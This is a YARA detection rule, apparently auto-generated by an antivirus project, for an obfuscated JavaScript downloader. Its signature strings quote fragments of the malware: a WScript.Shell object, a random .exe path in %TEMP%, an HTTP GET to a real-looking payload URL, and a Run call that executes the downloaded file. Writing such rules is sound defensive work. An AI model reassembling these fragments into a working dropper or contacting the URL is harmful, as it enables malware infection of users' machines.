rule sig_20160328_8c9f9f960c4ecc935bb8423d193bc7c5 {
  meta:
    description = "datamaliciousorder - file 20160328_8c9f9f960c4ecc935bb8423d193bc7c5.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "bcead60bbdfafa471a74afe99e59c5ce725b2f706f9aca06bc17040cfb03dba1"

  strings:
    $s1  = "function Svtilfiil() {return Vpoyfsa[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"8mZObq7OvrEcr.exe\";};" fullword ascii
    $s2  = "Feuhct[Wywes](\"GET\", \"http://portal.ofar.com.br/o4psaf\", false);" fullword ascii
    $s3  = "do {WScript[Gdhdvuxz](Yejqeuyne() * 11)} while (Feuhct[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Tfvbwnsgib(Vrced, Nqyhcehj){return Vrced - Nqyhcehj;};" fullword ascii
    $s5  = "var Vpoyfsa = function Tqiaffxknm() {return WScript[Lsojp](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Oqiwmkgjb() {return ((Vrxooqpy == true) && (Vrxooqpy == Qsrwhugmo)) ? 1 : Rrmhqbtk;};" fullword ascii
    $s7  = "function Fbniakqoqo(Arpecpn){Vpoyfsa[\"Run\"](Arpecpn, Rrmhqbtk, Rrmhqbtk);};" fullword ascii
    $s8  = "var Yarspcdik = new this[\"Date\"]();" fullword ascii
    $s9  = "function Qtkkxbj(Esjajs) {var Epnrqa = (1, 2, 3, 4, 5, Esjajs); return Epnrqa;};" fullword ascii
    $s10 = "function Xamzd()" fullword ascii
    $s11 = "function Yejqeuyne(){return 22;};" fullword ascii
    $s12 = " while (Nnyfqlgtd){" fullword ascii
    $s13 = "var Vrxooqpy = false;" fullword ascii
    $s14 = "var Nncsudyu = false;" fullword ascii
    $s15 = "Qsrwhugmo = true; " fullword ascii
    $s16 = "function Bvlrmpv(){return Lsojp;};" fullword ascii
    $s17 = "Vrxooqpy = true; " fullword ascii
    $s18 = "var Qsrwhugmo = false;" fullword ascii
    $s19 = "return Tfvbwnsgib(Esbjk, Ecfklgcm);" fullword ascii
    $s20 = "function Jmovrl(){return Znjdetm;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}